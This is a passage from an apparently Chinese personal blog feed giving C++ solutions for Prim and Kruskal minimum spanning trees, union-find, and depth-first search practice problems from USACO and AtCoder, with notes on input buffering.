class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> cost[MAX_V][MAX_V]; <span class="comment">//表示 e=(u,v)的权值，不存在的情况下为INF</span></span><br><span class="line"><span class="type">int</span> mincost[MAX_V];     <span class="comment">//从集合X 出发的边到每个顶点的最小权值</span></span><br><span class="line"><span class="type">bool</span> used[MAX_V];       <span class="comment">//顶点i是否被包含在集合X中</span></span><br><span class="line"><span class="type">int</span> V; <span class="comment">//顶点数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">prim</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; V; i++)&#123;</span><br><span class="line">mincost[i] = INF;</span><br><span class="line">used[i] = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">mincost[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">//由于随机取都行 这里直接拿第一个</span></span><br><span class="line"><span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="type">int</span> v = <span class="number">-1</span>; <span class="comment">//从不属于X的顶点选取从x到其权值最小的顶点</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> u = <span class="number">0</span>; u &lt; V; u++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!used[u]&amp;&amp;(v == <span class="number">-1</span> || mincost[u] &lt; mincost[v])) v = u;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(v == <span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line">used[v] = <span class="literal">true</span>;</span><br><span class="line">res += mincost[v];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> u = <span class="number">0</span>;u &lt;V; u++)&#123;</span><br><span class="line">mincost[u] = <span class="built_in">min</span>(mincost[u], cost[v][u]);  <span class="comment">//更新集合X 出发到每个边的最小权值</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="算法2kruskal算法"><a class="markdownIt-Anchor" href="#算法2kruskal算法">#</a> 算法 2（Kruskal 算法）</h4><p>下面是 Kruskal 算法。其是按照边的权值进行排序从小到大，如果不产生圈，就加上这条边。主要就是如何判断加的边是否形成圈（这里似乎可以用并查集的方法–&gt; 如果两个要连接的点属于同一根 则会形成圈 不属于同一根 则可以链接） Kruskal 在边排序较为费时间（边太多可以用 Prim 算法）<br>下面上代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">edge</span>&#123;<span class="type">int</span> u,v,cost;&#125;;</span><br><span class="line"><span class="type">int</span> par[MAX_V],rank[MAX_V];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_union_find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;V;i++)&#123;</span><br><span class="line">par[i] = i;</span><br><span class="line">rank[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(par[x] == x) <span class="keyword">return</span> x;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> par[x] = <span class="built_in">find</span>(par[x]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unite</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">x = <span class="built_in">find</span>(x);</span><br><span class="line">y = <span class="built_in">find</span>(y);</span><br><span class="line"><span class="keyword">if</span>(x == y) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(rank[x] &lt; rank[y])&#123;</span><br><span class="line">par[x] = y;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">par[y] = x;</span><br><span class="line"><span class="keyword">if</span> (rank[x] == rank[y]) rank[x]++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">same</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">find</span>(x) == <span class="built_in">find</span>(y) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="type">const</span> edge&amp; e1,<span class="type">const</span> edge&amp; e2)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> e1.cost &lt; e2.cost;</span><br><span class="line">&#125;</span><br><span class="line">edge es[MAX_E];</span><br><span class="line"><span class="type">int</span> V,E; <span class="comment">//V 定点数 E 边数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Kruskal</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">sort</span>( es, es+ E, cmp);</span><br><span class="line"><span class="built_in">init_union_find</span>(V);</span><br><span class="line"><span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; E; i++)&#123;</span><br><span class="line">edge e = es[i];</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">same</span>(e.u,e.v))&#123;</span><br><span class="line">res += e.cost;</span><br><span class="line"><span class="built_in">unite</span>(e.u,e.v);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="kmp算法"><a class="markdownIt-Anchor" href="#kmp算法">#</a> KMP 算法</h2>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KMP </tag>
            
            <tag> 学习 </tag>
            
            <tag> 最小生成树 </tag>
            
            <tag> 并查集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DFS--复习</title>
      <link href="/2023/11/13/DFS--%E5%A4%8D%E4%B9%A0/"/>
      <url>/2023/11/13/DFS--%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>先上题目：</p><hr><h1 id="usaco21-健康的荷斯坦奶牛-healthy-holsteins"><a class="markdownIt-Anchor" href="#usaco21-健康的荷斯坦奶牛-healthy-holsteins">#</a> [USACO2.1] 健康的荷斯坦奶牛 Healthy Holsteins</h1><h2 id="题目描述"><a class="markdownIt-Anchor" href="#题目描述">#</a> 题目描述</h2><p>农民 John 以拥有世界上最健康的奶牛为傲。他知道每种饲料中所包含的牛所需的最低的维他命量是多少。请你帮助农夫喂养他的牛，以保持它们的健康，使喂给牛的饲料的种数最少。</p><p>给出牛所需的最低的维他命量，输出喂给牛需要哪些种类的饲料，且所需的饲料剂量最少。</p><p>维他命量以整数表示，每种饲料最多只能对牛使用一次，数据保证存在解。</p><h2 id="输入格式"><a class="markdownIt-Anchor" href="#输入格式">#</a> 输入格式</h2><p>第一行一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span>，表示需要的维他命的种类数。<br>第二行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 个整数，表示牛每天需要的每种维他命的最小量。</p><p>第三行一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi></mrow><annotation encoding="application/x-tex">g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span></span></span></span>，表示可用来喂牛的饲料的种数。<br>下面 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi></mrow><annotation encoding="application/x-tex">g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span></span></span></span> 行，第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span> 行表示编号为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span> 饲料包含的各种维他命的量的多少。</p><h2 id="输出格式"><a class="markdownIt-Anchor" href="#输出格式">#</a> 输出格式</h2><p>输出文件只有一行，包括牛必需的最小的饲料种数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>；后面有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span> 个数，表示所选择的饲料编号（按从小到大排列）。</p><p>如果有多个解，输出饲料序号最小的（即字典序最小）。</p><h2 id="样例-1"><a class="markdownIt-Anchor" href="#样例-1">#</a> 样例 #1</h2><h3 id="样例输入-1"><a class="markdownIt-Anchor" href="#样例输入-1">#</a> 样例输入 #1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4</span><br><span class="line">100 200 300 400</span><br><span class="line">3</span><br><span class="line">50  50  50  50</span><br><span class="line">200 300 200 300</span><br><span class="line">900 150 389 399</span><br></pre></td></tr></table></figure><h3 id="样例输出-1"><a class="markdownIt-Anchor" href="#样例输出-1">#</a> 样例输出 #1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 1 3</span><br></pre></td></tr></table></figure><h2 id="提示"><a class="markdownIt-Anchor" href="#提示">#</a> 提示</h2><p>【数据范围】<br>对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>100</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">100\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">%</span></span></span></span> 的数据，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>v</mi><mo>≤</mo><mn>25</mn></mrow><annotation encoding="application/x-tex">1\le v \le 25</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">5</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>g</mi><mo>≤</mo><mn>15</mn></mrow><annotation encoding="application/x-tex">1\le g \le 15</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8304100000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">5</span></span></span></span>。<br>输入的所有整数在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mclose">]</span></span></span></span> 范围内。</p><p>USACO 2.1</p><p>翻译来自 NOCOW</p><h2 id="题解"><a class="markdownIt-Anchor" href="#题解">#</a> 题解</h2><p>太长时间没有刷题，一些简单的深搜也不太会写了。这题不用剪枝直接暴力即可。<br>每个饲料只有 0，1 两种状态（要或者不要）<br>然后 search (t,s)<br> t 代表选中的饲料，s 代表选中饲料的个数，要么 search (t+1,s) 当前饲料不选，要么 search (t+1,s+1)<br> 选当前饲料，数据量小直接就能 AC</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span> <span class="comment">//懒人最爱的万能头文件 </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;<span class="comment">//名字空间 </span></span><br><span class="line"><span class="type">int</span> ans[<span class="number">1000</span>];<span class="comment">//这个数组是来存储解的。 </span></span><br><span class="line"><span class="type">int</span> a[<span class="number">1000</span>];<span class="comment">//表示牛每天需要的每种维他命的最小量。 </span></span><br><span class="line"><span class="type">int</span> b[<span class="number">1000</span>][<span class="number">1000</span>];<span class="comment">//每种饲料包含的各种维他命的量的多少。</span></span><br><span class="line"><span class="type">int</span> c[<span class="number">1000</span>];<span class="comment">//每次搜索选的饲料编号 </span></span><br><span class="line"><span class="type">int</span> n,m,minn=<span class="number">100000000</span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">pd</span><span class="params">(<span class="type">int</span> x)</span><span class="comment">//这是判断每次选的那些饲料中的维生素之和是不是都大于等于牛每天需要的每种维他命的最小量的函数 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;=x; j++)</span><br><span class="line">sum+=b[c[j]][i];<span class="comment">//用一个sum累加 </span></span><br><span class="line"><span class="keyword">if</span>(sum&lt;a[i]) <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//如果有一项维生素比牛需要的维生素要少，直接返回false </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">search</span><span class="params">(<span class="type">int</span> t,<span class="type">int</span> s)</span><span class="comment">//搜索的函数 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(t&gt;m)<span class="comment">//边界</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">pd</span>(s))<span class="comment">//必须得满足条件</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(s&lt;minn)<span class="comment">//判断选的饲料的总数小于以前的最优解</span></span><br><span class="line">&#123;</span><br><span class="line">minn=s;<span class="comment">//替换掉</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=minn; i++)</span><br><span class="line">&#123;</span><br><span class="line">ans[i]=c[i];<span class="comment">//答案的数组也要被替换</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>; <span class="comment">//返回</span></span><br><span class="line">&#125;</span><br><span class="line">c[s+<span class="number">1</span>]=t;<span class="comment">//把t放在数组里</span></span><br><span class="line"><span class="built_in">search</span>(t+<span class="number">1</span>,s+<span class="number">1</span>);<span class="comment">//搜索一步</span></span><br><span class="line">c[s+<span class="number">1</span>]=<span class="number">0</span>;<span class="comment">//回溯一步</span></span><br><span class="line"><span class="built_in">search</span>(t+<span class="number">1</span>,s);<span class="comment">//如果不选第t种饲料的操作</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span><span class="comment">//主函数部分</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cin&gt;&gt;n;<span class="comment">//读入</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">cin&gt;&gt;a[i];<span class="comment">//读入</span></span><br><span class="line">cin&gt;&gt;m;<span class="comment">//读入</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=m; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;=n; j++)</span><br><span class="line">cin&gt;&gt;b[i][j];<span class="comment">//还是读入</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">search</span>(<span class="number">1</span>,<span class="number">0</span>);<span class="comment">//调用搜索函数</span></span><br><span class="line">cout&lt;&lt;minn&lt;&lt;<span class="string">&#x27; &#x27;</span>;<span class="comment">//输出</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=minn; i++)</span><br><span class="line">cout&lt;&lt;ans[i]&lt;&lt;<span class="string">&#x27; &#x27;</span>;<span class="comment">//还是输出</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//结束程序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写这个主要是因为第一眼还是 dx，dy 类型的深搜，刚开始手足无措没有想到如何处理这种 0，1 状态的深搜使其能搜索所有的状态。</p><p>下面再贴一道纯模板题</p><hr><h1 id="深さ優先探索"><a class="markdownIt-Anchor" href="#深さ優先探索">#</a> 深さ優先探索</h1><h2 id="题面翻译"><a class="markdownIt-Anchor" href="#题面翻译">#</a> 题面翻译</h2><p>高桥先生住的小区是长方形的，被划分成一个个格子。高桥先生想从家里去鱼店，高桥先生每次可以走到他前后左右四个格子中的其中一个，但不能斜着走，也不能走出小区。</p><p>现在给出地图：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```g```：代表鱼店</span><br><span class="line"></span><br><span class="line">```.```：代表道路</span><br><span class="line"></span><br><span class="line">```#```：代表墙壁</span><br><span class="line"></span><br><span class="line">高桥先生不能穿过墙壁。</span><br><span class="line"></span><br><span class="line">输入：第一行输入n(1&lt;=n&lt;=500),m(1&lt;=m&lt;=500)代表小区的长和宽，接下来n行每行m个字符，描述小区中的每个格子。</span><br><span class="line"></span><br><span class="line">输出：如果高桥先生能到达鱼店，输出&quot;Yes&quot;，否则输出&quot;No&quot;。</span><br><span class="line"></span><br><span class="line">## 题目描述</span><br><span class="line"></span><br><span class="line">[problemUrl]: https://atcoder.jp/contests/atc001/tasks/dfs_a</span><br><span class="line"></span><br><span class="line">この問題は、講座用問題です。ページ下部に解説が掲載されています。</span><br><span class="line"></span><br><span class="line">高橋君の住む街は長方形の形をしており、格子状の区画に区切られています。 長方形の各辺は東西及び南北に並行です。 各区画は道または塀のどちらかであり、高橋君は道を東西南北に移動できますが斜めには移動できません。 また、塀の区画は通ることができません。</span><br><span class="line"></span><br><span class="line">高橋君が、塀を壊したりすることなく道を通って魚屋にたどり着けるかどうか判定してください。</span><br><span class="line"></span><br><span class="line">## 输入格式</span><br><span class="line"></span><br><span class="line">入力は以下の形式で標準入力から与えられる。</span><br><span class="line"></span><br><span class="line">&gt; $ H $ $ W $ $ c_&#123;0,0&#125; $ $ c_&#123;0,1&#125; $ $ c_&#123;0,W-1&#125; $ $ c_&#123;1,0&#125; $ $ c_&#123;1,1&#125; $ $ c_&#123;1,W-1&#125; $ : $ c_&#123;H-1,0&#125; $ $ c_&#123;H-1,1&#125; $ $ c_&#123;H-1,W-1&#125; $</span><br><span class="line"></span><br><span class="line">- $ 1 $ 行目には、街の南北の長さとして整数 $ H(1≦H≦500) $ と東西の長さとして整数 $ W(1≦W≦500) $ が空白で区切られて与えられる。</span><br><span class="line">- $ 2 $ 行目からの $ H $ 行には、格子状の街の各区画における状態 $ c_&#123;i,j&#125;(0≦i≦H-1,\ 0≦j≦W-1) $ が与えられる。 </span><br><span class="line">  - $ i $ 行目 $ j $ 文字目の文字 $ c_&#123;i,j&#125; $ はそれぞれ `s`, `g`, `.`, `#` のいずれかで与えられ、座標 $ (j,i) $ が下記のような状態であることを表す。 </span><br><span class="line">      - `s` : その区画が家であることを表す。</span><br><span class="line">      - `g` : その区画が魚屋であることを表す。</span><br><span class="line">      - `.` : その区画が道であることを表す。</span><br><span class="line">      - `#` : その区画が塀であることを表す。</span><br><span class="line">  - 高橋君は家・魚屋・道は通ることができるが、塀は通ることができない。</span><br><span class="line">  - 与えられた街の外を通ることはできない。</span><br><span class="line">  - `s` と `g` はそれぞれ 1 つずつ与えられる。</span><br><span class="line"></span><br><span class="line">## 输出格式</span><br><span class="line"></span><br><span class="line">塀を $ 1 $ 回も壊さずに、家から魚屋まで辿り着くことができる場合は `Yes`、辿りつけない場合は `No` を標準出力に $ 1 $ 行で出力せよ。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 题解</span><br><span class="line"></span><br><span class="line">这道题就纯是最常见也是最简单的DFS了，多了一个字符串的转换，这里也可以复习一下getchar()函数和cin和scanf函数，</span><br><span class="line"></span><br><span class="line">&gt;**cin从第一个非空格、非回车、非tab键的位置开始读取，当与所要读取类型一致时则开始读取，遇上空格、tab键不再读取、回车结束。**</span><br><span class="line"></span><br><span class="line">&gt;输入缓冲区有数据：从输入缓冲区读取，从非空字符开始，遇到空格结束(回车、空格、tab)。尾回车会被留在输入缓冲区，并且不做处理。</span><br><span class="line">  输入缓冲区没有数据：获取键盘输入，当按下回车的时候，输入的数据连同刚按下的回车符被送入输入缓冲区。然后从输入缓冲区区读取数据，规则和上面标黄部分一样。</span><br><span class="line"></span><br><span class="line">&gt;1、scanf从非空格字符开始读取，空格字符结束(空格、TAB、回车)</span><br><span class="line">   2、当缓冲区没有数据的时候，需要先从键盘输入，然后放入缓冲区再读取。</span><br><span class="line">   3、当缓冲区有数据的时候不会从键盘获取数据。我们可以从上面输入看到第二个sacnf并没有从键盘获取数据</span><br><span class="line">   4、sacnf会把末尾回车留在缓冲区，给以后的输入埋雷</span><br><span class="line"></span><br><span class="line">接着贴上代码</span><br><span class="line"></span><br><span class="line">```cpp</span><br><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int map1[502][502];</span><br><span class="line">int record[502][502];</span><br><span class="line">#define xx x+dx[i]</span><br><span class="line">#define yy y+dy[i]</span><br><span class="line">int sx,sy,fx,fy;</span><br><span class="line">int dx[4]=&#123;0,0,1,-1&#125;;</span><br><span class="line">int dy[4]=&#123;1,-1,0,0&#125;;</span><br><span class="line">int n,m;</span><br><span class="line">int flag=0;</span><br><span class="line">void dfs(int x,int y)&#123;</span><br><span class="line">record[x][y]=1;</span><br><span class="line">if(x==fx&amp;&amp;y==fy)&#123;</span><br><span class="line">flag=1;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">if(!flag)</span><br><span class="line">for(int i=0;i&lt;4;i++)&#123;</span><br><span class="line">if(xx&lt;=n&amp;&amp;x&gt;0&amp;&amp;y&lt;=m&amp;&amp;y&gt;0&amp;&amp;map1[xx][yy]==0&amp;&amp;record[xx][yy]==0)&#123;</span><br><span class="line">dfs(xx,yy);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">getchar();</span><br><span class="line">for(int i=1;i&lt;=n;i++)&#123;</span><br><span class="line">for(int j=1;j&lt;=m;j++)&#123;</span><br><span class="line">char tmp;</span><br><span class="line">tmp = getchar();</span><br><span class="line">if(tmp==&#x27;s&#x27;)&#123;</span><br><span class="line">sx = i,sy = j;</span><br><span class="line">map1[i][j]=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(tmp == &#x27;#&#x27;)&#123;</span><br><span class="line">map1[i][j]=1;</span><br><span class="line">&#125;</span><br><span class="line">else if(tmp == &#x27;g&#x27;)&#123;</span><br><span class="line">fx=i,fy=j;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">map1[i][j] = 0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br><span class="line">dfs(sx,sy);</span><br><span class="line">if(flag)&#123;</span><br><span class="line">cout&lt;&lt;&quot;Yes&quot;&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">cout&lt;&lt;&quot;No&quot;&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再上一题 dfs，其实这一题和放的第一题是同一种类型，或者说是第一和第二的结合，在二维数组中每个元组有选和不选两种状态，这时候应该的做法。<br>先上题目：</p><h1 id="取数游戏"><a class="markdownIt-Anchor" href="#取数游戏">#</a> 取数游戏</h1><h2 id="题目描述-2"><a class="markdownIt-Anchor" href="#题目描述-2">#</a> 题目描述</h2><p>一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>×</mo><mi>M</mi></mrow><annotation encoding="application/x-tex">N\times M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 